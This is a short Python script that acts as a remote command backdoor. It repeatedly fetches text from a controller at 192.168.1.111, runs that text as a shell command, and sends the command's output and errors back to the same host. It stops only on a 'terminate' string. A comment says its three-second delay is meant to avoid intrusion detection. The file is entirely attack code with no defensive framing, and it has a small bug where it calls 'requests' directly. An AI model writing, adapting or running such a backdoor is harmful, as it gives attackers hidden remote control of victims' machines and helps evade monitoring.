#!/usr/bin/python

import requests
import subprocess # shell management
import time

while True:
    req = requests('http://192.168.1.111')
    command = req.text # request body

    if 'terminate' in command:
        break # this will break the loop
    else:
        CMD = subprocess.Popen(command,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
        post_response = requests.post(url="http://192.168.1.111", data=CMD.stdout.read())
        post_response = requests.post(url="http://192.168.1.111", data=CMD.stderr.read())

    # 3 seg cycle - avoiding IDS
    time.sleep(3)
